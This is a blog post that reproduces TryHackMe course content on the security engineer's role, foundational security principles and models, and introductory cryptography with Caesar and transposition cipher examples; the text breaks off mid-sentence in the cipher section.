---
title: "Security Engineer"
description: This is a blog on waht a security engineer does in anutshell, it also go ahead to give details on the tasks involved in this role.
date: 2024-01-22
draft: false # this section allows the post to be published and be public, is it is set to true the post will not be published.
summary: "Credit to TryHackMe" # Here you can write a small summary of the post if needed
tags: [Security Engineer]
categories: [TryHackMe]
---

# Introduction
[TryHackMe](https://tryhackme.com/signup?referrer=6325877cfcc474005111479e) provides one of the best contents when it comes to cybersecurity, below is a snippet of the content one will acquire when subcribed to the premium learning path of TryHackMe Security Engineer.
They have summarised the content very well and clealry understood, for practical experience, subscribe to their platform to gain the skills.

# SECURITY ENGINEER IN A NUTSHELL

## Introduction

**Who is a Security Engineer?**

### Why Do Organizations Need Security?

As the internet age transforms how organizations work worldwide, it 
also brings challenges. While there is no doubt that technology has made
 the life of organizations a lot easier by opening new avenues of 
collaboration and innovation, we often hear about organizations getting 
hacked, losing customer data, getting ransomed, and facing other types 
of cyber attacks. In responding to these threats, organizations can 
either go back to the old ways of doing business without getting any aid
 from modern technology, putting them at a disadvantage, or they can 
move forward and ensure the security of the digital side of their 
business. Hence, just like any organization will protect its physical 
assets and dedicate whole departments to them, a company's digital 
assets must also be secured. It must be noted here that organizations do
 all of this to ensure their primary goal is achieved without 
hindrance.

### The Role of a Security Engineer

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fbf160facf9498920fa98bbacf3336a9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fbf160facf9498920fa98bbacf3336a9.png)

Keeping in view the above-mentioned need for security, organizations 
hire security engineers. In order to hire a security engineer, an 
organization perceives a security engineer as someone who:

- Owns the overall security of an organization. The main person responsible for securing an organization's digital assets.
- Ensures that the organization's cyber security risk is minimized at all times.
- Devises strategies and creates systems that minimize the risk posed by cyber security threats to an organization.
- Periodically conducts tests to ensure the robustness of the cyber security posture
of an organization, identifies weak points, and prepares mitigations.
- Develops and implements secure network solutions.
- Architects and engineers trustworthy, reliable, and secure systems.
- Collaborates and coordinates with other teams to establish security protocols across the organization.

### Qualifications Required for a Security Engineer

As you might have noticed, the security engineer role mentioned above
 is very broad and might require a whole department instead of a single 
person. This is because this role is defined loosely and varies from 
organization to organization. An engineer takes large problems, breaks 
them down into smaller chunks, and then solves them. Therefore a 
security engineer is someone that follows this process for security
problems. Meaning that even though you might have a job description, 
each day might
be quite different since you are faced with various problems. Overall, 
when hiring a security engineer, organizations look for the following 
basic requirements:

- 0-2 years of experience with IT administration, helpdesk, networks or security operations.
- Basic understanding of computer networks, operating systems, and programming.
- Basic understanding of security concepts such as Governance, Risk and Compliance (GRC).

**Core Responsibilities of a Security Engineer**

In the previous task, 
we established that a security engineer is responsible for an 
organization's security posture. In this task, we will expand on the 
general expectations that an organization has from a security engineer 
in order to help them achieve their goals in this role. Although loosely
 defined, a security engineer will often be responsible for the areas 
that follow.

### Asset Management/Asset Inventory

One of the primary steps in ensuring an organization's security is to
 maintain an organization's asset inventory. In terms of cyber security,
 this will mean managing and maintaining an inventory of an 
organization's digital assets. Security engineers can only own an 
organization's security if they know what assets the organization has. 
They must also ensure that this asset inventory is regularly maintained 
and updated and includes all the required information about assets such 
as asset name, type, IP addresses, physical location, place in the 
network, applications running on an asset, access permissions (only 
within the organization or public-facing), and the asset owner details.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/28f1276e16598eb550db01ebf0abed64.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/28f1276e16598eb550db01ebf0abed64.png)

### Security Policies

An organization needs robust security 
policies to maintain a sound security posture. A security engineer helps
 the organization create security policies based on established [Security Principles](https://tryhackme.com/room/securityprinciples).
 These policies are then implemented organization-wide, and the security
 engineer ensures that the implementation follows the letter and spirit 
of the policies. Sometimes, a need arises for granting exceptions to the
 security policies due to business needs. In such scenarios, the 
security engineer consults the security principles to allow or deny 
exceptions and suggest mitigating steps to minimize risks.

### Secure by Design

A security engineer ensures that the organization is secure by 
design. The engineer understands that the security posture receives the 
most Return on Investment (ROI) if it follows a secure-by-design 
philosophy. This means that the security engineer takes steps to 
implement a Secure Network Architecture *(room coming soon!)*, ensures the organization's [Windows](https://tryhackme.com/room/microsoftwindowshardening), [Linux](https://tryhackme.com/room/linuxsystemhardening), and [Active Directory](https://tryhackme.com/room/activedirectoryhardening) are hardened, and software development follows the [Secure Software Development Lifecycle](https://tryhackme.com/room/securesdlc).

### Security Assessment and Assurance

While
 securely designing the organization's network and infrastructure might 
be an excellent first step, a security engineer understands that their 
job is far from done after that. They understand that security is hard 
work that requires continuous effort. While a security engineer must 
ensure everything is done correctly, a compromise requires just one 
loophole to be successful. To mitigate risks from a continuously 
evolving threat landscape, a security engineer plans to conduct regular 
security assessments, audits, and red-teaming and purple-teaming 
exercises to continuously improve the security posture. While security 
engineers might not be performing assessments and audits themselves, 
they are primarily involved in helping schedule these activities, 
creating Request for Quotations (RFQs) for external parties to perform 
these activities, and helping prioritize and implement the findings from
 them.

**Continuous Improvement**

An organization's 
security is not a one-time job but a continuous effort. Similarly, the 
security engineer's job doesn't end once policies are designed and 
implemented. Rather, it is a journey towards continuous improvement. The
 following steps help a security engineer carry out this role.

### Ensuring Awareness

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/c2378401279a49b88bd5e8c77fc4336e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/c2378401279a49b88bd5e8c77fc4336e.png)

A security engineer might be tasked with maintaining a certain 
security awareness level in the organization. Humans are the building 
blocks of any organization, and as is often said, humans are the weakest
 link in an organization's security. A security engineer periodically 
runs awareness sessions targeting primarily social engineering attacks 
to ensure that humans don't make mistakes that can compromise an 
organization's security. Awareness sessions are also organized for 
specific teams to ensure they follow security principles related to 
their area of expertise, like secure software development or secure 
network architecture.

### Managing Risks

The executive management of most organizations looks at 
security from the lens of minimizing risks. Security is essential to 
businesses because ignoring it can result in operational disruptions, 
data leakage, lawsuits, or other forms of risk. Therefore, a security 
engineer is often tasked with identifying security risks, determining 
their likelihood and impact, and finding solutions to minimize those 
risks. It must be noted that eliminating all risks might not be possible
 when running business operations. Sometimes, a decision has to be made 
to accept a risk and move on. In such a scenario, the security engineer 
might perform some mitigating actions to lower the risk. Accepting or 
mitigating risks is often a business decision, and a security engineer 
acts as a trusted advisor of the management that helps them take this 
decision by providing subject matter expertise. Let's take the example 
of an organization that uses a database software for its supply chain 
that runs on a vulnerable version of Linux.
 This software is essential to the organization's operations. Updating 
the software, so that it can run on the latest OS version that is not 
vulnerable, without impacting operations might take significant effort 
(more than a year). It will require engagement with the vendor, who has 
not yet tested the software on the latest OS version. Deploying the 
software without testing on the latest OS version will risk causing 
problems in the organization's operations. In such a scenario, the 
vulnerable OS version poses a security risk. A security engineer might 
suggest mitigating the risk by hardening the OS through additional 
controls and adding a reverse proxy in front of the vulnerable system to
 avoid exposing it to the internet. While these steps will not eliminate
 the risk, they will significantly reduce it without affecting the 
organization's operations.

### Change Management

Organizations keep evolving with time, which also results in changes 
in their security posture. To ensure a robust security posture, the 
security engineer keeps track of changes in the organization's digital 
assets that can affect the security posture and takes measures to 
improve the security posture with the organization's evolution. Let's 
assume an organization wants to upgrade the e-commerce module of its 
website for its corporate customers. The new module will require a risk 
assessment, penetration testing, and vulnerability assessment before 
integrating with the website. The security engineer will ensure that all
 these requirements are fulfilled and that the integration will not 
introduce security vulnerabilities. Furthermore, it will also be ensured
 that the new module follows all the security policies and guidelines 
laid out by the organization.

### Vulnerability Management

The threat landscape is continuously evolving. New software versions 
are released, and vulnerabilities are found in the older versions. The 
security engineer's job often includes monitoring vulnerabilities across
 the organization and planning to patch or minimize their risk. 
Vulnerabilities are generally patched according to severity, as we will 
learn in the [Vulnerability Management](https://tryhackme.com/room/vulnerabilitymanagementkj) room.

### Compliance and Audits

A significant part of a security engineer's duties includes 
ensuring compliance with regulatory and organizational requirements. 
Depending on the industry, clientele, and location of the organization, 
it might be subject to various compliance standards such as PCI-DSS, HIPAA,
 SOC2, ISO27001, NIST-800-53, and more. A security engineer works 
closely with both internal and external auditors to detect any 
non-compliance issues and effectively address them. Additionally, they 
are responsible for upholding the organization's security certifications
 as needed.

**Additional Roles and Responsibilities**

As discussed 
previously, the security engineer's role is often loosely defined and 
broad-based. In certain organizations, a security engineer might need to
 take up some additional responsibilities to help other teams, which we 
will cover in this task.

### Managing Security Tooling

A security engineer might sometimes be required to configure or 
fine-tune security tools such as SIEMs, Firewalls, WAFs, EDRs, and more.
 In some organizations, that might also be the primary responsibility of
 a security engineer. In such a role, a security engineer might also be 
making decisions or providing input to decision-makers about tools to 
procure based on the organization's requirements and the engineer's 
assessments of competitive tools.

### Tabletop Exercises

Tabletop exercises are often conducted to gauge the operational 
readiness of an organization from a security point of view. Certain 
scenarios are identified to be exercised, and security team members must
 explain their respective roles in the scenarios under discussion. For 
example, a scenario might include the compromise of an endpoint device 
through a phishing email. All the team members will then explain their 
respective steps per the organization's playbooks. The security engineer
 is sometimes required to conduct these exercises.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8b107a8c1d6abddd851c2709ef8fae5a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8b107a8c1d6abddd851c2709ef8fae5a.png)

### Disaster Recovery and Crisis Management

A robust security posture requires organizations to plan for untoward
 incidents, disasters, or crises. In any such scenario, the top priority
 of the executive management is to maintain business continuity. A 
security engineer might be involved in disaster recovery, business 
continuity, and crisis management planning as part of the different 
compliance frameworks and the organization's internal policies. The role
 of a security engineer in these areas might differ depending on the 
organization.

## **SECURITY PRINCIPLES**

**Introduction**

Security has become a buzzword; every company wants to claim its product or service is secure. But is it?

Before we start discussing the different security principles, it is 
vital to know the adversary against whom we are protecting our assets. 
Are you trying to stop a toddler from accessing your laptop? Or are you 
trying to protect a laptop that contains technical designs worth 
millions of dollars? Using the exact protection mechanisms against 
toddlers and industrial espionage actors would be ludicrous. 
Consequently, knowing our adversary is a must so we can learn about 
their attacks and start implementing appropriate security controls.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/93d526dfe4950c1e9cafca1e6efe40f4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/93d526dfe4950c1e9cafca1e6efe40f4.png)

It is impossible to achieve perfect security; no solution is 100% 
secure. Therefore, we try to improve our security posture to make it 
more difficult for our adversaries to gain access.

**CIA**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/58a85d2e5942ebf3e78eb01c82f563be.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/58a85d2e5942ebf3e78eb01c82f563be.png)

Before we can describe something as *secure*, we need to 
consider better what makes up security. When you want to judge the 
security of a system, you need to think in terms of the security triad: 
confidentiality, integrity, and availability (CIA).

- **Confidentiality** ensures that only the intended persons or recipients can access the data.
- **Integrity** aims to ensure that the data cannot be altered; moreover, we can detect any alteration if it occurs.
- **Availability** aims to ensure that the system or service is available when needed.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/6b93d35050cea9dc51b700855677edf4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/6b93d35050cea9dc51b700855677edf4.png)

Let’s consider the CIA security triad in the case of placing an order for online shopping:

- **Confidentiality**: During online shopping, you expect your credit card number to be disclosed only to the entity that
processes the payment. If you doubt that your credit card information
will be disclosed to an untrusted party, you will most likely refrain
from continuing with the transaction. Moreover, if a data breach results in the disclosure of personally identifiable information, including
credit cards, the company will incur huge losses on multiple levels.
- **Integrity**: After filling out your order, if an
intruder can alter the shipping address you have submitted, the package
will be sent to someone else. Without data integrity, you might be very
reluctant to place your order with this seller.
- **Availability**: To place your online order, you will
either browse the store’s website or use its official app. If the
service is unavailable, you won’t be able to browse the products or
place an order. If you continue to face such technical issues, you might eventually give up and start looking for a different online store.

Let’s consider the CIA as it relates to patient records and related systems:

- **Confidentiality**: According to various laws in
modern countries, healthcare providers must ensure and maintain the
confidentiality of medical records. Consequently, healthcare providers
can be held legally accountable if they illegally disclose their
patients’ medical records.
- **Integrity**: If a patient record is accidentally or
maliciously altered, it can lead to the wrong treatment being
administered, which, in turn, can lead to a life-threatening situation.
Hence, the system would be useless and potentially harmful without
ensuring the integrity of medical records.
- **Availability**: When a patient visits a clinic to
follow up on their medical condition, the system must be available. An
unavailable system would mean that the medical practitioner cannot
access the patient’s records and consequently won’t know if any current
symptoms are related to the patient’s medical history. This situation
can make the medical diagnosis more challenging and error-prone.

The emphasis does not need to be the same on all three security 
functions. One example would be a university announcement; although it 
is usually not confidential, the document’s integrity is critical.

### Beyond CIA

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/aaeda28067dbaa5573f640e467be7834.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/aaeda28067dbaa5573f640e467be7834.png)

Going one more step beyond the CIA security triad, we can think of:

- **Authenticity**: Authentic means not fraudulent or
counterfeit. Authenticity is about ensuring that the document/file/data
is from the claimed source.
- **Nonrepudiation**: Repudiate means refusing to
recognize the validity of something. Nonrepudiation ensures that the
original source cannot deny that they are the source of a particular
document/file/data. This characteristic is indispensable for various
domains, such as shopping, patient diagnosis, and banking.

These two requirements are closely related. The need to tell 
authentic files or orders from fake ones is indispensable. Moreover, 
ensuring that the other party cannot deny being the source is vital for 
many systems to be usable.

In online shopping, depending on your business, you might tolerate 
attempting to deliver a t-shirt with cash-on-delivery and learn later 
that the recipient never placed such an order. However, no company can 
tolerate shipping 1000 cars to discover that the order is fake. In the 
example of a shopping order, you want to confirm that the said customer 
indeed placed this order; that’s authenticity. Moreover, you want to 
ensure they cannot deny placing this order; that’s nonrepudiation.

As a company, if you receive a shipment order of 1000 cars, you need 
to ensure the authenticity of this order; moreover, the source should 
not be able to deny placing such an order. Without authenticity and 
nonrepudiation, the business cannot be conducted.

### Parkerian Hexad

In 1998, Donn Parker proposed the Parkerian Hexad, a set of six security elements. They are:

1. Availability
2. Utility
3. Integrity
4. Authenticity
5. Confidentiality
6. Possession

We have already covered four of the above six elements. Let's discuss the remaining two elements:

- **Utility**: Utility focuses on the usefulness of the information. For instance, a
user might have lost the decryption key to access a laptop with
encrypted storage. Although the user still has the laptop with its
disk(s) intact, they cannot access them. In other words, although still
available, the information is in a form that is not useful, i.e., of no
utility.
- **Possession**: This security element requires that
we protect the information from unauthorized taking, copying, or
controlling. For instance, an adversary might take a backup drive,
meaning we lose possession of the information as long as they have the
drive. Alternatively, the adversary might succeed in encrypting our data using ransomware; this also leads to the loss of possession of the
data.

**DAD**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/1742c9b384adb60b896481b2416d2f8a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/1742c9b384adb60b896481b2416d2f8a.png)

The security of a system is attacked through one of several means. It
 can be via the disclosure of secret data, alteration of data, or 
destruction of data.

- **Disclosure** is the opposite of confidentiality. In other words, disclosure of confidential data would be an attack on confidentiality.
- **Alteration** is the opposite of Integrity. For example, the integrity of a cheque is indispensable.
- **Destruction/Denial** is the opposite of Availability.

The opposite of the CIA Triad would be the DAD Triad: Disclosure, Alteration, and Destruction.

Consider the previous example of patient records and related systems:

- Disclosure: As in most modern countries, healthcare providers must
maintain medical records’ confidentiality. As a result, if an attacker
succeeds in stealing some of these medical records and dumping them
online to be viewed publicly, the health care provider will incur a loss due to this data disclosure attack.
- Alteration: Consider the gravity of the situation if the attacker
manages to modify patient medical records. This alteration attack might
lead to the wrong treatment being administered, and consequently, this
alteration attack could be life-threatening.
- Destruction/Denial: Consider the case where a medical facility has
gone completely paperless. If an attacker manages to make the database
systems unavailable, the facility will not be able to function properly. They can go back to paper temporarily; however, the patient records
won’t be available. This denial attack would stall the whole facility.

Protecting against disclosure, alteration, and destruction/denial is 
of utter significance. This protection is equivalent to working to 
maintain confidentiality, integrity and availability.

Protecting 
confidentiality and integrity to an extreme can restrict availability, 
and increasing availability to an extreme can result in losing 
confidentiality and integrity. Good security principles implementation 
requires a balance between the three.

**Fundamental Concepts of Security Models**

We
 have learned that the security triad is represented by Confidentiality,
 Integrity, and Availability (CIA). One might ask, how can we create a 
system that ensures one or more security functions? The answer would be 
in using security models. In this task, we will introduce three 
foundational security models:

- Bell-LaPadula Model
- The Biba Integrity Model
- The Clark-Wilson Model

### Bell-LaPadula Model

The Bell-LaPadula Model aims to achieve **confidentiality** by specifying three rules:

- **Simple Security Property**: This property is referred to as “no read up”; it states that a subject at a lower security level
cannot read an object at a higher security level. This rule prevents
access to sensitive information above the authorized level.
- **Star Security Property**: This property is referred
to as “no write down”; it states that a subject at a higher security
level cannot write to an object at a lower security level. This rule
prevents the disclosure of sensitive information to a subject of lower
security level.
- **Discretionary-Security Property**: This property uses an access matrix to allow read and write operations. An example access
matrix is shown in the table below and used in conjunction with the
first two properties.

| Subjects | Object A | Object B |
| --- | --- | --- |
| Subject 1 | Write | No access |
| Subject 2 | Read/Write | Read |

The first two properties can be summarized as “write up, read down.” 
You can share confidential information with people of higher security 
clearance (write up), and you can receive confidential information from 
people with lower security clearance (read down).

There are certain limitations to the Bell-LaPadula model. For example, it was not designed to handle file-sharing.

### Biba Model

The Biba Model aims to achieve **integrity** by specifying two main rules:

- **Simple Integrity Property**: This property is referred to as “no read down”; a higher integrity subject should not read from a lower integrity object.
- **Star Integrity Property**: This property is referred to as “no write up”; a lower integrity subject should not write to a higher integrity object.

These two properties can be summarized as “read up, write down.” This
 rule is in contrast with the Bell-LaPadula Model, and this should not 
be surprising as one is concerned with confidentiality while the other 
is with integrity.

Biba Model suffers from various limitations. One example is that it does not handle internal threats (insider threat).

### Clark-Wilson Model

The Clark-Wilson Model also aims to achieve integrity by using the following concepts:

- **Constrained Data Item (CDI)**: This refers to the data type whose integrity we want to preserve.
- **Unconstrained Data Item (UDI)**: This refers to all data types beyond CDI, such as user and system input.
- **Transformation Procedures (TPs)**: These procedures are programmed operations, such as read and write, and should maintain the integrity of CDIs.
- **Integrity Verification Procedures (IVPs)**: These procedures check and ensure the validity of CDIs.

We covered only three security models. The reader can explore many additional security models. Examples include:

- Brewer and Nash model
- Goguen-Meseguer model
- Sutherland model
- Graham-Denning model
- Harrison-Ruzzo-Ullman model

**Defence-in-Depth**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d015a7748c8b6930e0c25b571230d873.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d015a7748c8b6930e0c25b571230d873.png)

**Defence-in-Depth** refers to creating a security system of multiple levels; hence it is also called Multi-Level Security.

Consider the following analogy: you have a locked drawer where you 
keep your important documents and pricey stuff. The drawer is locked; 
however, do you want this drawer lock to be the only thing standing 
between a thief and your expensive items? If we think of multi-level 
security, we would prefer that the drawer be locked, the relevant room 
be locked, the main door of the apartment be locked, the building gate 
be locked, and you might even want to throw in a few security cameras 
along the way. Although these multiple levels of security cannot stop 
every thief, they would block most of them and slow down the others.

**ISO/IEC 19249**

The International 
Organization for Standardization (ISO) and the International 
Electrotechnical Commission (IEC) have created the ISO/IEC 19249. In 
this task, we will brush briefly upon ISO/IEC 19249:2017 *Information
 technology - Security techniques - Catalogue of architectural and 
design principles for secure products, systems and applications*. The purpose is to have a better idea of what international organizations would teach regarding security principles.

ISO/IEC 19249 lists five *architectural* principles:

1. **Domain Separation**: Every set of related components
is grouped as a single entity; components can be applications, data, or
other resources. Each entity will have its own domain and be assigned a
common set of security attributes. For example, consider the x86
processor privilege levels: the operating system kernel can run in ring 0 (the most privileged level). In contrast, user-mode applications can
run in ring 3 (the least privileged level). Domain separation is
included in the Goguen-Meseguer Model.
2. **Layering**: When a system is structured into many
abstract levels or layers, it becomes possible to impose security
policies at different levels; moreover, it would be feasible to validate the operation. Let’s consider the OSI (Open Systems Interconnection)
model with its seven layers in networking. Each layer in the OSI model
provides specific services to the layer above it. This layering makes it possible to impose security policies and easily validate that the
system is working as intended. Another example from the programming
world is disk operations; a programmer usually uses the disk read and
write functions provided by the chosen high-level programming language.
The programming language hides the low-level system calls and presents
them as more user-friendly methods. Layering relates to Defence in
Depth.
3. **Encapsulation**: In object-oriented programming
(OOP), we hide low-level implementations and prevent direct manipulation of the data in an object by providing specific methods for that
purpose. For example, if you have a clock object, you would provide a
method `increment()` instead of giving the user direct access to the `seconds` variable. The aim is to prevent invalid values for your variables.
Similarly, in larger systems, you would use (or even design) a proper
Application Programming Interface (API) that your application would use to access the database.
4. **Redundancy**: This principle ensures availability and integrity. There are many examples related to redundancy. Consider the
case of a hardware server with two built-in power supplies: if one power supply fails, the system continues to function. Consider a RAID 5
configuration with three drives: if one drive fails, data remains
available using the remaining two drives. Moreover, if data is
improperly changed on one of the disks, it would be detected via the
parity, ensuring the data’s integrity.
5. **Virtualization**: With the advent of cloud services,
virtualization has become more common and popular. The concept of
virtualization is sharing a single set of hardware among multiple
operating systems. Virtualization provides sandboxing capabilities that
improve security boundaries, secure detonation, and observance of
malicious programs.

ISO/IEC 19249 teaches five *design* principles:

1. **Least Privilege**: You can also phrase it informally
as “need-to basis” or “need-to-know basis” as you answer the question,
“who can access what?” The principle of least privilege teaches that you should provide the least amount of permissions for someone to carry out their task and nothing more. For example, if a user needs to be able to view a document, you should give them read rights without write rights.
2. **Attack Surface Minimisation**: Every system has vulnerabilities that an attacker might use to compromise a system. Some vulnerabilities are known, while others are yet to be discovered. These vulnerabilities represent risks that we should aim to minimize. For
example, in one of the steps to harden a Linux system, we would disable any service we don’t need.
3. **Centralized Parameter Validation**: Many threats are
due to the system receiving input, especially from users. Invalid inputs can be used to exploit vulnerabilities in the system, such as denial of service and remote code execution. Therefore, parameter validation is a necessary step to ensure the correct system state. Considering the
number of parameters a system handles, the validation of the parameters
should be centralized within one library or system.
4. **Centralized General Security Services**: As a
security principle, we should aim to centralize all security services.
For example, we would create a centralized server for authentication. Of course, you might take proper measures to ensure availability and
prevent creating a single point of failure.
5. **Preparing for Error and Exception Handling**:
Whenever we build a system, we should take into account that errors and
exceptions do and will occur. For instance, in a shopping application, a customer might try to place an order for an out-of-stock item. A
database might get overloaded and stop responding to a web application.
This principle teaches that the systems should be designed to fail safe; for example, if a firewall crashes, it should block all traffic instead of allowing all traffic. Moreover, we should be careful that error
messages don’t leak information that we consider confidential, such as
dumping memory content that contains information related to other
customers.

**Zero Trust versus Trust but Verify**

Trust is a very complex
 topic; in reality, we cannot function without trust. If one were to 
think that the laptop vendor has installed spyware on the laptop, they 
would most likely end up rebuilding the system. If one were to mistrust 
the hardware vendor, they would stop using it completely. If we think of
 trust on a business level, things only become more sophisticated; 
however, we need some guiding security principles. Two security 
principles that are of interest to us regarding trust:

- Trust but Verify
- Zero Trust

**Trust but Verify**: This principle teaches that we 
should always verify even when we trust an entity and its behaviour. An 
entity might be a user or a system. Verifying usually requires setting 
up proper logging mechanisms; verifying indicates going through the logs
 to ensure everything is normal. In reality, it is not feasible to 
verify everything; just think of the work it takes to review all the 
actions taken by a single entity, such as Internet pages browsed by a 
single user. This requires automated security mechanisms, such as proxy,
 intrusion detection, and intrusion prevention systems.

**Zero Trust**: This principle treats trust as a 
vulnerability, and consequently, it caters to insider-related threats. 
After considering trust as a vulnerability, zero trust tries to 
eliminate it. It is teaching indirectly, “never trust, always verify.” 
In other words, every entity is considered adversarial until proven 
otherwise. Zero trust does not grant trust to a device based on its 
location or ownership. This approach contrasts with older models that 
would trust internal networks or enterprise-owned devices. 
Authentication and authorization are required before accessing any 
resource. As a result, if any breach occurs, the damage would be more 
contained if a zero trust architecture had been implemented.

Microsegmentation
 is one of the implementations used for Zero Trust. It refers to the 
design where a network segment can be as small as a single host. 
Moreover, communication between segments requires authentication, access
 control list checks, and other security requirements.

There is a limit to how much we can apply zero trust without 
negatively impacting a business; however, this does not mean that we 
should not apply it as long as it is feasible.

**Threat versus Risk**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/e3325cdb65ebf0d9edc3db22c5131937.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/e3325cdb65ebf0d9edc3db22c5131937.png)

There are three terms that we need to take note of to avoid any confusion.

- **Vulnerability**: Vulnerable means susceptible to attack or damage. In information security, a vulnerability is a weakness.
- **Threat**: A threat is a potential danger associated with this weakness or vulnerability.
- **Risk**: The risk is concerned with the likelihood of a threat actor exploiting a vulnerability and the consequent impact on
the business.

Away from information systems, a showroom with doors and windows made of standard glass suffers a weakness, or *vulnerability*, due to the nature of glass. Consequently, there is a *threat* that the glass doors and windows can be broken. The showroom owners should contemplate the *risk*, i.e. the likelihood that a glass door or window gets broken and the resulting impact on the business.

Consider another example directly related to information systems. You
 work for a hospital that uses a particular database system to store all
 the medical records. One day, you are following the latest security 
news, and you learn that the used database system is not only vulnerable
 but also a proof-of-concept working exploit code has been released; the
 released exploit code indicates that the threat is real. With this 
knowledge, you must consider the resulting risk and decide the next 
steps.

## **INTRO TO CRYPTOGRAPHY**

**Introduction**

The purpose of this room is to introduce users to basic cryptography concepts such as:

- Symmetric encryption, such as AES
- Asymmetric encryption, such as RSA
- Diffie-Hellman Key Exchange
- Hashing
- PKI

Suppose you want to send a message that no one can understand except the intended recipient. How would you do that?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a31ad9ee6b4e321453508e8662fc4679.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a31ad9ee6b4e321453508e8662fc4679.png)

One of the simplest ciphers is the Caesar cipher, used more than 2000
 years ago. Caesar Cipher shifts the letter by a fixed number of places 
to the left or to the right. Consider the case of shifting by 3 to the 
right to encrypt, as shown in the figure below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b4f1cbf444e5f19f855dadb7f272ab50.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b4f1cbf444e5f19f855dadb7f272ab50.png)

The recipient needs to know that the text was shifted by 3 to the right to recover the original message.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/45b482f79ebcc2f202813a5d7de4df87.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/45b482f79ebcc2f202813a5d7de4df87.png)

Using the same key to encrypt “TRY HACK ME”, we get “WUB KDFN PH”.

The Caesar Cipher that we have described above can use a key between 1
 and 25. With a key of 1, each letter is shifted by one position, where A
 becomes B, and Z becomes A. With a key of 25, each letter is shifted by
 25 positions, where A becomes Z, and B becomes A. A key of 0 means no 
change; moreover, a key of 26 will also lead to no change as it would 
lead to a full rotation. Consequently, we conclude that Caesar Cipher 
has a keyspace of 25; there are 25 different keys that the user can 
choose from.

Consider the case where you have intercepted a message encrypted 
using Caesar Cipher: “YMNX NX FQUMF GWFAT HTSYFHYNSL YFSLT MTYJQ RNPJ”. 
We are asked to decrypt it without knowledge of the key. We can attempt 
this by using brute force, i.e., we can try all the possible keys and 
see which one makes the most sense. In the following figure, we noticed 
that key being 5 makes the most sense, “THIS IS ALPHA BRAVO CONTACTING 
TANGO HOTEL MIKE.”

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/83c79636b07babb43ffe5402e2697772.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/83c79636b07babb43ffe5402e2697772.png)

Caesar cipher is considered a **substitution cipher** because each letter in the alphabet is substituted with another.

Another type of cipher is called **transposition cipher**,
 which encrypts the message by changing the order of the letters. Let’s 
consider a simple transposition cipher in the figure below. We start 
with the message, “THIS IS ALPHA BRAVO CONTACTING TANGO HOTEL MIKE”, and
 the key `42351`. After we write the letters of our message 
by filling one column after the other, we rearrange the columns based on
 the key and then read the rows. In other words, we write by columns and
 we read by rows. Also notice that we ignored all the space in the 
plaintext in this example.  The resulting ciphertext “NPCOTGHOTH…” is 
read one row after the other. In other words, a transposition cipher 
simply rearranges the order of the letters, unlike the substitution 
cipher, which substitutes the letters without changing their order.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d1c99f9bf3e305eb4b50cb8c30be430d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d1c99f9bf3e305eb4b50cb8c30be430d.png)

This task introduced simple substitution and transposition ciphers 
and applied them to messages made of alphabetic characters. For an 
encryption algorithm to be considered **secure**, it should be infeasible to recover the original message, i.e., plaintext. (In mathematical terms, we need a **hard**
 problem, i.e., a problem that cannot be solved in polynomial time. A 
problem that we can solve in polynomial time is a problem 
that’s feasible to solve even for large input, although it might take 
the computer quite some time to finish.)

If the encrypted message can be broken in one week, the encryption 
used would be considered insecure. However, if the encrypted message can
 be broken in 1 million years, the encryption would be considered 
practically secure.

Consider the mono-alphabetic substitution cipher, where each letter 
is mapped to a new letter. For example, in English, you would map “a” to
 one of the 26 English letters, then you would map “b” to one of the 
remaining 25 English letters, and then map “c” to one of the remaining 
24 English letters, and so on.

For example, we might choose the letters in the alphabet 
